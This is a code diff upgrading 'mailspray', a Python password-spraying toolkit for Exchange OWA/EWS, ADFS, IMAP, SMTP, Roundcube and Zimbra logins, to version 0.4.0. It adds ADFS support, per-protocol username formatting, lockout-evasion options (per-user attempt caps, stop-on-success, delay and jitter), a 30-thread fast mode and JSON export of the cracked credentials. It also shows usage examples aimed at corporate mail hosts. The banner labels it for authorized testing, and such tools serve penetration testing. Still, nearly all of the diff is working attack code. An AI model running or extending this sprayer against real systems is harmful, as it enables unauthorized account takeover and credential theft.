@@ -7,6 +7,8 @@ import random
 import argparse
 import threading
 import warnings
+import json
+from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
@@ -15,13 +17,13 @@ warnings.filterwarnings("ignore", message=".*urllib3.*")
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
 try:
-    from modules import OWAModule, IMAPModule, SMTPModule, RoundcubeModule, EWSModule, ZimbraModule
+    from modules import OWAModule, IMAPModule, SMTPModule, RoundcubeModule, EWSModule, ZimbraModule, ADFSModule
 except ImportError as e:
     print(f"\033[1;31m[!]\033[0m Missing dependency: {e}")
     print(f"\033[1;33m[*]\033[0m Run: pip3 install requests")
     sys.exit(1)
 
-__version__ = "0.3.0"
+__version__ = "0.4.0"
 
 # ── Colors ──────────────────────────────────────────────────────────
 
@@ -45,10 +47,25 @@ class C:
 PROTOCOLS = {
     "owa":       {"name": "OWA",       "cls": OWAModule,       "port": 443},
     "ews":       {"name": "EWS",       "cls": EWSModule,       "port": 443},
+    "adfs":      {"name": "ADFS",      "cls": ADFSModule,      "port": 443},
     "imap":      {"name": "IMAP",      "cls": IMAPModule,      "port": 993},
     "smtp":      {"name": "SMTP",      "cls": SMTPModule,      "port": 587},
     "roundcube": {"name": "RCUBE",     "cls": RoundcubeModule, "port": 443},
     "zimbra":    {"name": "ZIMBRA",    "cls": ZimbraModule,    "port": 443},
+}
+
+# Default username format per protocol when --user-format auto is used
+# domain_prefix → CORP\user   (Exchange native, NTLM-style)
+# upn           → user@domain (UPN, required by ADFS; typical for Zimbra/Roundcube)
+# plain         → user        (no domain applied — SMTP/IMAP depend on server config)
+PROTOCOL_USER_FORMAT = {
+    "owa":       "domain_prefix",
+    "ews":       "domain_prefix",
+    "adfs":      "upn",
+    "imap":      "plain",
+    "smtp":      "plain",
+    "roundcube": "upn",
+    "zimbra":    "upn",
 }
 
 def proto_tag(name):
@@ -62,6 +79,9 @@ def log_fail(proto, target, user, password):
 
 def log_error(proto, target, user, msg):
     print(f"  {proto_tag(proto)} {target:<28} {C.Y}[!]{C.X} {user} — {C.Y}{msg}{C.X}")
+
+def log_skip(proto, target, user, reason):
+    print(f"  {proto_tag(proto)} {target:<28} {C.D}[~]{C.X} {user} — {C.D}{reason}{C.X}")
 
 def log_info(msg):
     print(f"  {C.C}[*]{C.X} {msg}")
@@ -91,8 +111,12 @@ class SprayEngine:
         self.args = args
         self.lock = threading.Lock()
         self.found = []
+        self._found_data = []       # structured records for JSON output
+        self._user_attempts = {}    # {username: attempt_count} — lockout tracking
+        self._user_found = set()    # usernames with at least one valid cred
         self.total = 0
         self.done = 0
+        self.skipped = 0
         self.errors = 0
         self.start_time = None
 
@@ -111,13 +135,40 @@ class SprayEngine:
         uri = f"{proto}://{user}:{password}@{host}"
         with self.lock:
             self.found.append(uri)
+            self._found_data.append({
+                "protocol": proto,
+                "host": host,
+                "username": user,
+                "password": password,
+                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
+            })
             if self.args.output:
                 with open(self.args.output, "a") as f:
                     f.write(uri + "\n")
 
     def _worker(self, scanner, user, password, proto_key, target):
-        self._delay()
         proto_name = PROTOCOLS[proto_key]["name"]
+
+        # ── Pre-flight checks (under lock to avoid race conditions) ──
+        with self.lock:
+            if self.args.stop_on_success and user in self._user_found:
+                self.done += 1
+                self.skipped += 1
+                if self.args.verbose:
+                    log_skip(proto_name, target, user, "already found")
+                return
+
+            if self.args.max_attempts > 0:
+                attempts = self._user_attempts.get(user, 0)
+                if attempts >= self.args.max_attempts:
+                    self.done += 1
+                    self.skipped += 1
+                    if self.args.verbose:
+                        log_skip(proto_name, target, user,
+                                 f"max attempts reached ({self.args.max_attempts})")
+                    return
+
+        self._delay()
 
         try:
             result = scanner.login(user, password)
@@ -125,12 +176,17 @@ class SprayEngine:
             with self.lock:
                 self.errors += 1
                 self.done += 1
+                self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
             if self.args.verbose:
                 log_error(proto_name, target, user, str(e)[:60])
             return
 
+        # Update shared state once — single lock acquisition per successful attempt
         with self.lock:
             self.done += 1
+            self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
+            if result:
+                self._user_found.add(user)
 
         if result:
             log_success(proto_name, target, user, password)
@@ -142,9 +198,14 @@ class SprayEngine:
         self.total = len(pairs)
         self.start_time = time.time()
 
-        log_info(f"Starting spray: {C.W}{self.total}{C.X} combinations / {C.W}{self.args.threads}{C.X} threads")
+        log_info(f"Starting spray: {C.W}{self.total}{C.X} combinations / {C.W}{self.args.threads}{C.X} threads"
+                 + (f" / {C.Y}no delay{C.X}" if self.args.delay == 0 else ""))
         if self.args.delay > 0:
             log_info(f"Delay: {self.args.delay}s (jitter: {self.args.jitter})")
+        if self.args.max_attempts > 0:
+            log_info(f"Max attempts per user: {C.Y}{self.args.max_attempts}{C.X}")
+        if self.args.stop_on_success:
+            log_info(f"Stop-on-success: {C.Y}enabled{C.X}")
         print()
 
         try:
@@ -164,13 +225,20 @@ class SprayEngine:
     def _summary(self):
         elapsed = time.time() - self.start_time
         minutes, seconds = divmod(int(elapsed), 60)
+        actual = self.done - self.skipped
+        rps = f"{actual / elapsed:.1f}" if elapsed > 0 else "∞"
 
         print()
         print(f"  {C.W}{'─' * 58}{C.X}")
-        print(f"  {C.W}Results:{C.X}  {C.G}{len(self.found)} found{C.X}  /  "
-              f"{self.done} tested  /  "
-              f"{C.Y}{self.errors} errors{C.X}  /  "
-              f"{minutes}m {seconds}s")
+
+        stats = (f"{C.G}{len(self.found)} found{C.X}  /  "
+                 f"{self.done} tested  /  "
+                 f"{C.Y}{self.errors} errors{C.X}")
+        if self.skipped:
+            stats += f"  /  {C.D}{self.skipped} skipped{C.X}"
+        stats += f"  /  {minutes}m {seconds}s  /  {C.C}{rps} req/s{C.X}"
+
+        print(f"  {C.W}Results:{C.X}  {stats}")
 
         if self.found:
             print(f"  {C.W}Creds:{C.X}")
@@ -179,6 +247,11 @@ class SprayEngine:
             if self.args.output:
                 print(f"  {C.W}Saved:{C.X}   {self.args.output}")
 
+        if self.args.json_output and self._found_data:
+            with open(self.args.json_output, "w") as f:
+                json.dump(self._found_data, f, indent=2)
+            print(f"  {C.W}JSON:{C.X}    {self.args.json_output}")
+
         print(f"  {C.W}{'─' * 58}{C.X}")
         print()
 
@@ -186,11 +259,12 @@ class SprayEngine:
 # ── CLI ─────────────────────────────────────────────────────────────
 
 BANNER = f"""
-{C.R}                 _ __
-  __ _  ___ _(_) /__ ___  _______ ___ __
- /  ' \\/ _ `/ / (_-</ _ \\/ __/ _ `/ // /
-/_/_/_/\\_,_/_/_/___/ .__/_/  \\_,_/\\_, /
-                  /_/    {C.C}v{__version__}{C.R}     /___/{C.X}
+{C.R}______  ___      __________________
+___   |/  /_____ ___(_)__  /_  ___/____________________ _____  __
+__  /|_/ /_  __ `/_  /__  /_____ ___  __ \\_  ___/  __ `/_  / / /
+_  /  / / / /_/ /_  / _  / ____/ /__  /_/ /  /   / /_/ /_  /_/ /
+/_/  /_/  \\__,_/ /_/  /_/  /____/ _  .___//_/    \\__,_/ _\\__, /
+                                  /_/  {C.C}v{__version__}{C.R}           /____/{C.X}
 {C.D} mail password spraying toolkit // authorized testing only{C.X}
 """
 
@@ -218,23 +292,34 @@ def build_parser():
     auth.add_argument("-p", "--password", required=True, metavar="PASS",
                       help="Password or file with passwords")
     auth.add_argument("-d", "--domain", metavar="DOMAIN",
-                      help="Prepend DOMAIN\\ to usernames")
+                      help="Domain to apply to usernames (format chosen automatically per protocol)")
+    auth.add_argument("--user-format", choices=["auto", "domain_prefix", "upn", "plain"],
+                      default="auto", metavar="FMT",
+                      help="Override username format: auto (default), domain_prefix (CORP\\user), upn (user@domain), plain (no domain)")
 
     engine = parser.add_argument_group(f"{C.W}ENGINE{C.X}")
     engine.add_argument("-t", "--threads", type=int, default=5, metavar="N",
-                        help="Thread count (default: 5)")
+                        help="Thread count (default: 5; use --fast for local/internal targets)")
+    engine.add_argument("--fast", action="store_true",
+                        help="Fast mode for internal targets: 30 threads, no delay (overrides -t if not set)")
     engine.add_argument("--delay", type=float, default=0.0, metavar="SEC",
                         help="Delay between requests in seconds")
     engine.add_argument("--jitter", type=float, default=0.0, metavar="0-1",
                         help="Jitter factor for delay (0.0-1.0)")
     engine.add_argument("--timeout", type=int, default=10, metavar="SEC",
                         help="Connection timeout (default: 10)")
+    engine.add_argument("--max-attempts", type=int, default=0, metavar="N",
+                        help="Max login attempts per user before skipping (0 = unlimited)")
+    engine.add_argument("--stop-on-success", action="store_true",
+                        help="Skip remaining passwords for a user after first success")
 
     output = parser.add_argument_group(f"{C.W}OUTPUT{C.X}")
     output.add_argument("-o", "--output", default="found.txt", metavar="FILE",
                         help="Output file for valid creds (default: found.txt)")
+    output.add_argument("--json", dest="json_output", metavar="FILE",
+                        help="Save found credentials to JSON file")
     output.add_argument("-v", "--verbose", action="store_true",
-                        help="Show failed attempts and errors")
+                        help="Show failed attempts, skips, and errors")
     output.add_argument("--no-color", action="store_true",
                         help="Disable colored output")
 
@@ -246,34 +331,41 @@ def build_parser():
                       help="Show version")
 
     parser.epilog = f"""{C.W}USAGE EXAMPLES:{C.X}
-  {C.D}# OWA spray (HTTPS by default){C.X}
-  mailspray owa mail.corp.com -u users.txt -p 'Winter2026!'
+  {C.D}# External OWA — safe defaults: 5 threads, delay 30s, max 3 attempts per user{C.X}
+  mailspray owa mail.corp.com -u users.txt -p 'Winter2026!' -d CORP \\
+    --max-attempts 3 --stop-on-success --delay 30 --jitter 0.3
 
-  {C.D}# Full URL when you need HTTP or custom port{C.X}
-  mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt
+  {C.D}# External ADFS — UPN auto-applied, same safe settings{C.X}
+  mailspray adfs adfs.corp.com -u users.txt -p passes.txt -d corp.local \\
+    --max-attempts 3 --stop-on-success --delay 30 --jitter 0.3
 
-  {C.D}# Spray with domain prefix{C.X}
-  mailspray owa https://mail.corp.com -u users.txt -p pass.txt -d CORP
+  {C.D}# External EWS — may be open even when OWA is firewalled{C.X}
+  mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP \\
+    --max-attempts 3 --stop-on-success --delay 20 --jitter 0.5
 
-  {C.D}# IMAP on non-standard port, verbose{C.X}
-  mailspray imap 10.10.10.5 -P 143 -u admin@corp.local -p passwords.txt -v
+  {C.D}# Internal/local target — --fast sets 30 threads, no delay{C.X}
+  mailspray imap 192.168.1.10 -u users.txt -p 'Password1' --fast
+  mailspray owa 10.10.10.5 -u users.txt -p passes.txt -d CORP --fast --max-attempts 3
 
-  {C.D}# SMTP with rate limiting{C.X}
-  mailspray smtp smtp.target.com -u emails.txt -p passwords.txt -t 3 --delay 2 --jitter 0.5
+  {C.D}# SMTP external — no domain by default; add if server requires email format{C.X}
+  mailspray smtp smtp.target.com -u emails.txt -p passwords.txt --delay 5 --jitter 0.4
+  mailspray smtp smtp.corp.com -u users.txt -p passes.txt -d corp.local --user-format upn
 
-  {C.D}# EWS with domain prefix{C.X}
-  mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP
+  {C.D}# Roundcube on custom HTTP port{C.X}
+  mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt -d corp.com
 
-  {C.D}# Zimbra webmail on HTTP{C.X}
-  mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!'
+  {C.D}# Zimbra + JSON output{C.X}
+  mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!' \\
+    -d target.com --json results.json
 
 {C.W}SUPPORTED PROTOCOLS:{C.X}
-  owa          Outlook Web Access (Exchange)       [443]
-  ews          Exchange Web Services (NTLM/Basic)  [443]
-  imap         IMAP with SSL/STARTTLS              [993]
-  smtp         SMTP with STARTTLS                  [587]
-  roundcube    Roundcube Webmail                    [443]
-  zimbra       Zimbra Webmail                      [443]
+  owa          Outlook Web Access (Exchange)           [443]  auto: CORP\\user
+  ews          Exchange Web Services (NTLM/Basic)      [443]  auto: CORP\\user
+  adfs         AD Federation Services (WS-Trust)       [443]  auto: user@domain
+  imap         IMAP with SSL/STARTTLS                  [993]  auto: plain
+  smtp         SMTP with STARTTLS                      [587]  auto: plain
+  roundcube    Roundcube Webmail                       [443]  auto: user@domain
+  zimbra       Zimbra Webmail                          [443]  auto: user@domain
 """
     return parser
 
@@ -298,13 +390,30 @@ def main():
         parser.error("No passwords provided")
 
     if args.domain:
-        users = [f"{args.domain}\\{u}" if "\\" not in u and "@" not in u else u for u in users]
+        fmt = args.user_format if args.user_format != "auto" else PROTOCOL_USER_FORMAT[args.protocol]
+        if fmt == "plain":
+            log_warn(f"Protocol {args.protocol.upper()} uses plain usernames — "
+                     f"domain '{args.domain}' not applied automatically. "
+                     f"Use --user-format upn or domain_prefix to override.")
+        elif fmt == "upn":
+            users = [f"{u}@{args.domain}" if "\\" not in u and "@" not in u else u for u in users]
+        else:  # domain_prefix
+            users = [f"{args.domain}\\{u}" if "\\" not in u and "@" not in u else u for u in users]
 
     # password spraying order: each password against all users first
     pairs = []
     for p in passwords:
         for u in users:
             pairs.append((u, p))
+
+    # ── Fast mode (internal/local targets) ──
+    # Only bumps threads if user didn't pass -t explicitly
+    _threads_default = 5
+    if args.fast:
+        if args.threads == _threads_default:
+            args.threads = 30
+        if args.delay == 0.0:
+            pass  # keep no delay — intentional
 
     # ── Init scanner ──
     proto = PROTOCOLS[args.protocol]
@@ -317,6 +426,17 @@ def main():
     # ── Banner ──
     print(BANNER)
     print(f"  {proto_tag(proto['name'])} {C.W}{scanner.base_url()}{C.X}")
+    if args.fast:
+        log_warn(f"Fast mode: {C.Y}{args.threads}{C.X} threads — for internal targets only")
+
+    if args.domain:
+        fmt = args.user_format if args.user_format != "auto" else PROTOCOL_USER_FORMAT[args.protocol]
+        fmt_labels = {
+            "domain_prefix": f"{args.domain}\\\\user",
+            "upn":           f"user@{args.domain}",
+            "plain":         "plain (no domain)",
+        }
+        log_info(f"User format: {C.W}{fmt_labels[fmt]}{C.X}")
 
     log_info(f"Users: {len(users)}  |  Passwords: {len(passwords)}  |  Total: {len(pairs)}")
 
